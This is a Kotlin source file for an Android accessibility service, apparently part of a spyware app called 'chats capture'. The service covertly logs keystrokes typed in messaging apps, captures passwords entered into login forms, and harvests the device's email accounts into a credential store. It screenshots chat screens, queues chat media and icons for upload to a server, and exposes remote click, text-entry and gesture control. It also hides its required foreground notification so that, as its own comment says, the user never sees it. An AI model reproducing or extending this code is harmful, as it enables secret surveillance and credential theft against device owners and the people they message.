package com.chats.capture.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Path
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.chats.capture.CaptureApplication
import com.chats.capture.CaptureApplication.Companion.KEYBOARD_CHANNEL_ID
import com.chats.capture.database.ChatDao
import com.chats.capture.models.ChatData
import com.chats.capture.utils.ScreenCapture
import com.chats.capture.utils.ScreenshotCapture
import com.chats.capture.utils.MessageBuffer
import com.chats.capture.utils.MessageGroupingManager
import com.chats.capture.utils.ChatMediaExtractor
import com.chats.capture.utils.IconCacheManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import java.io.File
import java.io.FileOutputStream
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

class EnhancedAccessibilityService : AccessibilityService() {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private lateinit var chatDao: ChatDao
    private lateinit var screenCapture: ScreenCapture
    private lateinit var passwordCaptureManager: com.chats.capture.utils.PasswordCaptureManager
    private lateinit var credentialExtractor: com.chats.capture.utils.CredentialExtractor
    private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
    private lateinit var messageBuffer: MessageBuffer
    private lateinit var messageGroupingManager: MessageGroupingManager
    private lateinit var chatMediaExtractor: ChatMediaExtractor
    private lateinit var mediaUploadManager: MediaUploadManager
    private lateinit var screenshotCapture: ScreenshotCapture
    
    private var lastTextBuffer = ""
    private var lastPackageName = ""
    private var lastChatIdentifier: String? = null
    private var lastWindowId: Int = -1
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        Timber.d("EnhancedAccessibilityService connected")
        
        val database = (application as CaptureApplication).database
        chatDao = database.chatDao()
        screenCapture = ScreenCapture(this)
        screenshotCapture = ScreenshotCapture(this)
        passwordCaptureManager = com.chats.capture.utils.PasswordCaptureManager(
            this,
            database.credentialDao(),
            serviceScope
        )
        credentialExtractor = com.chats.capture.utils.CredentialExtractor(this)
        deviceRegistrationManager = com.chats.capture.managers.DeviceRegistrationManager(this)
        messageBuffer = MessageBuffer(this)
        messageGroupingManager = MessageGroupingManager(messageBuffer)
        chatMediaExtractor = ChatMediaExtractor(this)
        
        val mediaFileDao = database.mediaFileDao()
        val notificationDao = database.notificationDao()
        mediaUploadManager = MediaUploadManager(this, mediaFileDao, notificationDao, chatDao)
        
        // Restore buffers from persistence
        messageBuffer.restoreAllBuffers()
        
        // Register this service instance in Application for screenshot capture
        (application as CaptureApplication).setEnhancedAccessibilityService(this)
        
        // Extract and save email accounts configured on device
        extractDeviceEmailAccounts()
        
        // Start periodic check for timed-out messages
        startMessageTimeoutChecker()
        
        startForegroundService()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Timber.d("EnhancedAccessibilityService destroyed")
        
        // Unregister service instance
        (application as CaptureApplication).setEnhancedAccessibilityService(null)
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
                // Also check for password fields
                passwordCaptureManager.handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleViewClicked(event)
                // Check for form submissions (login buttons)
                passwordCaptureManager.handleFormSubmission(event)
                // Check if send button was clicked
                checkMessageCompletion(event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // Check if Enter key was pressed (message completion)
                checkMessageCompletion(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(event)
                // Handle app switching
                handleAppSwitch(event)
            }
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> {
                handleGestureDetected(event)
            }
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                handleViewScrolled(event)
            }
        }
        
        // Capture screen content periodically
        captureScreenContent(event)
    }
    
    override fun onInterrupt() {
        Timber.w("EnhancedAccessibilityService interrupted")
    }
    
    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.firstOrNull()?.toString() ?: ""
        
        // Debounce: skip if same text and package
        if (text == lastTextBuffer && packageName == lastPackageName) {
            return
        }
        
        if (text.isNotBlank() && text.length > 1) {
            val appName = getAppName(packageName)
            val chatIdentifier = messageGroupingManager.extractChatIdentifier(event)
            
            // Add to message buffer
            val buffer = messageBuffer.addKeyEvent(
                packageName = packageName,
                appName = appName,
                chatIdentifier = chatIdentifier,
                text = text
            )
            
            lastTextBuffer = text
            lastPackageName = packageName
            lastChatIdentifier = chatIdentifier
            
            // Check if this is a multi-line message (don't complete on Enter)
            if (messageGroupingManager.isMultiLineInput(event)) {
                // Continue buffering
                return
            }
        }
    }
    
    /**
     * Check if message should be completed (Enter key or send button)
     */
    private fun checkMessageCompletion(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        if (messageGroupingManager.isEnterKeyPressed(event)) {
            // Enter key or send button pressed - complete message
            completeMessage(packageName)
        }
    }
    
    /**
     * Complete and save a message from buffer
     */
    private fun completeMessage(packageName: String) {
        val buffer = messageBuffer.getAndClear(packageName) ?: return
        
        if (buffer.currentText.isBlank()) {
            return
        }
        
        serviceScope.launch(Dispatchers.IO) {
            try {
                val deviceId = deviceRegistrationManager.getDeviceId()
                
                // Check for duplicate chat (same app, text within 5 seconds)
                val duplicate = chatDao.findDuplicateChat(
                    buffer.packageName,
                    buffer.currentText,
                    buffer.startTime
                )
                
                if (duplicate == null) {
                    // Create chat record first to get its ID
                    val chatData = ChatData(
                        deviceId = deviceId,
                        appPackage = buffer.packageName,
                        appName = buffer.appName,
                        chatIdentifier = buffer.chatIdentifier,
                        text = buffer.currentText,
                        keyHistory = buffer.keyHistory.ifEmpty { null },
                        mediaUrls = null, // Will be updated after media upload
                        timestamp = buffer.startTime,
                        synced = false
                    )
                    
                    chatDao.insertChat(chatData)

                    // Capture chat icon once per chat identifier
                    captureChatIconIfNeeded(buffer, chatData.id)
                    
                    // Try to extract media from current screen
                    val rootNode = rootInActiveWindow
                    val mediaFiles = chatMediaExtractor.extractMediaFromNode(rootNode)
                    
                    // Process and upload media files if found
                    val mediaUrls = mutableListOf<String>()
                    val mediaFileIds = mutableListOf<String>()
                    
                    mediaFiles?.forEach { mediaPath ->
                        try {
                            val file = java.io.File(mediaPath)
                            if (file.exists() && file.length() > 0) {
                                // Calculate checksum and determine MIME type
                                val checksum = calculateFileChecksum(file)
                                val mimeType = determineMimeType(file)
                                
                                // Save media file to database with chat ID (prefix with "chat_")
                                val mediaFile = MediaFile(
                                    notificationId = "chat_${chatData.id}", // Prefix to identify chat media
                                    appPackage = buffer.packageName,
                                    localPath = mediaPath,
                                    fileSize = file.length(),
                                    mimeType = mimeType,
                                    checksum = checksum,
                                    uploadStatus = UploadStatus.PENDING
                                )
                                
                                val database = (application as CaptureApplication).database
                                database.mediaFileDao().insertMediaFile(mediaFile)
                                mediaFileIds.add(mediaFile.id)
                                
                                // Upload media file (will update chat with server URLs)
                                mediaUploadManager.uploadMediaFile(mediaFile)
                                
                                mediaUrls.add(mediaPath)
                                Timber.d("Chat media file captured: $mediaPath")
                            }
                        } catch (e: Exception) {
                            Timber.e(e, "Error processing chat media file: $mediaPath")
                        }
                    }
                    
                    // Update chat with local media URLs if any
                    if (mediaUrls.isNotEmpty()) {
                        val updatedChat = chatData.copy(mediaUrls = mediaUrls)
                        chatDao.updateChat(updatedChat)
                    }
                    
                    com.chats.capture.utils.AppStateManager.incrementChatCount(this@EnhancedAccessibilityService)
                    Timber.d("Chat message captured: ${chatData.id} with ${buffer.keyHistory.size} key events and ${mediaUrls.size} media files")
                } else {
                    Timber.v("Duplicate chat message skipped: ${duplicate.id}")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error saving completed chat message")
            }
        }
    }

    private suspend fun captureChatIconIfNeeded(buffer: MessageBuffer.BufferData, chatId: String) {
        val chatIdentifier = buffer.chatIdentifier?.trim().orEmpty()
        if (chatIdentifier.isBlank()) return

        val iconKey = "${buffer.packageName.lowercase()}|${chatIdentifier.lowercase()}"
        if (IconCacheManager.hasIcon(this, iconKey)) return

        val iconPath = captureHeaderIconPath() ?: return
        val iconFile = File(iconPath)
        if (!iconFile.exists() || iconFile.length() == 0L) return

        val checksum = calculateFileChecksum(iconFile)
        val mimeType = determineMimeType(iconFile)
        val iconMediaFile = MediaFile(
            notificationId = "icon_chat_$chatId",
            appPackage = buffer.packageName,
            localPath = iconPath,
            fileSize = iconFile.length(),
            mimeType = mimeType,
            checksum = checksum,
            uploadStatus = UploadStatus.PENDING
        )

        val database = (application as CaptureApplication).database
        database.mediaFileDao().insertMediaFile(iconMediaFile)
        mediaUploadManager.uploadMediaFile(iconMediaFile)
        IconCacheManager.markIconCaptured(this, iconKey)
    }

    private suspend fun captureHeaderIconPath(): String? {
        val rootNode = rootInActiveWindow ?: return null
        val iconNode = findHeaderIconNode(rootNode) ?: return null

        val bounds = Rect()
        iconNode.getBoundsInScreen(bounds)
        if (bounds.width() <= 0 || bounds.height() <= 0) return null

        val screenshotPath = screenshotCapture.captureScreenshot() ?: return null
        val screenshotFile = File(screenshotPath)
        if (!screenshotFile.exists()) return null

        return try {
            val bitmap = BitmapFactory.decodeFile(screenshotPath) ?: return null
            val left = bounds.left.coerceAtLeast(0)
            val top = bounds.top.coerceAtLeast(0)
            val right = bounds.right.coerceAtMost(bitmap.width)
            val bottom = bounds.bottom.coerceAtMost(bitmap.height)
            if (right <= left || bottom <= top) return null

            val cropped = Bitmap.createBitmap(bitmap, left, top, right - left, bottom - top)
            val iconDir = File(getExternalFilesDir(null), "icons")
            if (!iconDir.exists()) iconDir.mkdirs()
            val iconFile = File(iconDir, "chat_icon_${System.currentTimeMillis()}.png")
            FileOutputStream(iconFile).use { out ->
                cropped.compress(Bitmap.CompressFormat.PNG, 90, out)
            }

            screenshotFile.delete()

            iconFile.absolutePath
        } catch (e: Exception) {
            Timber.e(e, "Error cropping header icon")
            null
        }
    }

    private fun findHeaderIconNode(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val candidates = mutableListOf<AccessibilityNodeInfo>()
        collectImageNodes(rootNode, candidates)

        if (candidates.isEmpty()) return null

        val screenHeight = resources.displayMetrics.heightPixels
        val topLimit = (screenHeight * 0.25).toInt()

        return candidates
            .map { node ->
                val rect = Rect()
                node.getBoundsInScreen(rect)
                node to rect
            }
            .filter { (_, rect) -> rect.top < topLimit && rect.width() > 40 && rect.height() > 40 }
            .maxByOrNull { (_, rect) -> rect.width() * rect.height() }
            ?.first
    }

    private fun collectImageNodes(node: AccessibilityNodeInfo?, list: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return
        try {
            if (node.className?.toString()?.contains("ImageView", ignoreCase = true) == true) {
                list.add(node)
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                collectImageNodes(child, list)
                child?.recycle()
            }
        } catch (e: Exception) {
            Timber.e(e, "Error collecting image nodes")
        }
    }
    
    private fun calculateFileChecksum(file: java.io.File): String {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                md.update(buffer, 0, bytesRead)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
    
    private fun determineMimeType(file: java.io.File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "avi" -> "video/x-msvideo"
            "mov" -> "video/quicktime"
            "mkv" -> "video/x-matroska"
            "3gp" -> "video/3gpp"
            "mp3" -> "audio/mpeg"
            "wav" -> "audio/wav"
            "ogg" -> "audio/ogg"
            else -> "application/octet-stream"
        }
    }
    
    /**
     * Handle app switching - save current buffers
     */
    private fun handleAppSwitch(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        // If switching to different app, check if previous app had incomplete message
        if (lastPackageName.isNotBlank() && lastPackageName != packageName) {
            messageGroupingManager.handleAppSwitch(lastPackageName)
        }
    }
    
    /**
     * Start periodic checker for timed-out messages
     */
    private fun startMessageTimeoutChecker() {
        serviceScope.launch(Dispatchers.IO) {
            while (true) {
                try {
                    delay(2000) // Check every 2 seconds
                    
                    // Get all timed-out buffers
                    val timedOutBuffers = messageBuffer.getTimedOutBuffers()
                    
                    for (buffer in timedOutBuffers) {
                        completeMessage(buffer.packageName)
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error in message timeout checker")
                }
            }
        }
    }
    
    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""
        
        Timber.d("Window state changed: $packageName/$className")
        
        // Track app usage
        serviceScope.launch {
            // App usage tracking will be handled by AppUsageMonitor
        }
    }
    
    private fun handleGestureDetected(event: AccessibilityEvent) {
        Timber.d("Gesture detected: ${event.eventType}")
        // Gesture capture can be extended here
    }
    
    private fun handleViewClicked(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        Timber.d("View clicked in: $packageName")
    }
    
    private fun handleViewScrolled(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        Timber.d("View scrolled in: $packageName")
    }
    
    private fun captureScreenContent(event: AccessibilityEvent) {
        // Capture screen content periodically (throttled)
        serviceScope.launch {
            try {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val screenData = screenCapture.captureScreenHierarchy(rootNode)
                    // Store screen capture data if needed
                    Timber.d("Screen content captured: ${screenData.elementCount} elements")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error capturing screen content")
            }
        }
    }
    
    private fun extractChatIdentifier(event: AccessibilityEvent): String? {
        return try {
            val source = event.source ?: return null
            val windowTitle = source.window?.title?.toString()
            windowTitle?.takeIf { it.isNotBlank() }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting chat identifier")
            null
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    /**
     * Extract email accounts configured on device and save them
     */
    private fun extractDeviceEmailAccounts() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val emailAccounts = credentialExtractor.getEmailAccounts()
                val database = (application as CaptureApplication).database
                val credentialDao = database.credentialDao()
                
                val deviceId = deviceRegistrationManager.getDeviceId()
                
                for (account in emailAccounts) {
                    // Note: Passwords cannot be retrieved directly from AccountManager
                    // They will be captured when user enters them via AccessibilityService
                    val credential = com.chats.capture.models.Credential(
                        deviceId = deviceId,
                        accountType = com.chats.capture.models.CredentialType.EMAIL_ACCOUNT,
                        email = account.email,
                        username = account.accountName,
                        password = "", // Will be captured when user enters it
                        domain = extractDomainFromEmail(account.email),
                        timestamp = System.currentTimeMillis(),
                        synced = false
                    )
                    
                    credentialDao.insertCredential(credential)
                    Timber.d("Email account found: ${account.email}")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error extracting device email accounts")
            }
        }
    }
    
    private fun extractDomainFromEmail(email: String): String? {
        return email.substringAfter("@").takeIf { it.isNotBlank() }
    }
    
    // UI Interaction methods
    fun clickNode(node: AccessibilityNodeInfo): Boolean {
        return try {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } catch (e: Exception) {
            Timber.e(e, "Error clicking node")
            false
        }
    }
    
    fun inputText(node: AccessibilityNodeInfo, text: String): Boolean {
        return try {
            val arguments = android.os.Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        } catch (e: Exception) {
            Timber.e(e, "Error inputting text")
            false
        }
    }
    
    fun scrollNode(node: AccessibilityNodeInfo, direction: Int): Boolean {
        return try {
            if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.M) {
                return false
            }
            
            val action = when (direction) {
                SCROLL_UP -> if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) 0x00000001 else return false // ACTION_SCROLL_UP
                SCROLL_DOWN -> if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) 0x00000002 else return false // ACTION_SCROLL_DOWN
                SCROLL_LEFT -> if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) 0x00000004 else return false // ACTION_SCROLL_LEFT
                SCROLL_RIGHT -> if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) 0x00000008 else return false // ACTION_SCROLL_RIGHT
                else -> return false
            }
            node.performAction(action)
        } catch (e: Exception) {
            Timber.e(e, "Error scrolling node")
            false
        }
    }
    
    fun performGesture(path: Path, duration: Long): Boolean {
        return try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
                    .build()
                
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        Timber.d("Gesture completed")
                    }
                    
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        Timber.w("Gesture cancelled")
                    }
                }, null)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error performing gesture")
            false
        }
    }
    
    private fun startForegroundService() {
        // Create completely silent and invisible notification
        // Required for foreground service but user will never see it
        val notification = androidx.core.app.NotificationCompat.Builder(
            this,
            KEYBOARD_CHANNEL_ID
        )
            .setContentTitle("") // Empty title
            .setContentText("") // Empty text
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // System icon (less visible)
            .setOngoing(true)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN) // Minimum priority
            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET) // Hidden on lock screen
            .setShowWhen(false) // Don't show timestamp
            .setSilent(true) // Completely silent
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= 34) {
            startForeground(KEYBOARD_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(KEYBOARD_SERVICE_ID, notification)
        }
    }
    
    companion object {
        private const val KEYBOARD_SERVICE_ID = 1002
        const val SCROLL_UP = 1
        const val SCROLL_DOWN = 2
        const val SCROLL_LEFT = 3
        const val SCROLL_RIGHT = 4
    }
}
